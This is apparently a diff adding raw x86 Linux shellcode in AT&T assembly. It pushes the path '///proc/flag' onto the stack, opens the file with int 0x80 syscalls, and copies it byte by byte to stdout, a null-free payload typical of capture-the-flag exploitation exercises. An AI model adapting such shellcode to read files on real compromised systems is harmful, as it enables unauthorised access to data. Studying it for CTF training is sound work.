@@ -1,0 +1,39 @@
+ xor    %ecx,%ecx
+ xor    %eax,%eax
+ xor    %edx,%edx
+ push   %ecx
+ mov    $0x5,%al
+ push   $0x67616c66
+ push   $0x2f636f72
+ push   $0x702f2f2f
+ mov    %esp,%ebx
+ int    $0x80
+ sub    $0x7c,%esp
+ sub    $0x7c,%esp
+ sub    $0x7c,%esp
+ sub    $0x7c,%esp
+ mov    %eax,4(%esp)
+read:
+ mov    4(%esp),%eax
+ sub    $0x1,%esp
+ mov    %esp,%ecx
+ mov    %eax,%ebx
+ mov    $0x3,%al
+ xor    %edx,%edx
+ inc    %edx
+ int    $0x80
+ xor    %ebx,%ebx
+ cmp    %eax,%ebx
+ je     exit
+write:
+ xor    %eax,%eax
+ xor    %ebx,%ebx
+ mov    $0x1,%bl
+ mov    $0x4,%al
+ int    $0x80
+ add    $0x1,%esp
+ jmp    read
+exit:
+ xor    %eax,%eax
+ mov    $0x1,%al
+ int    $0x80
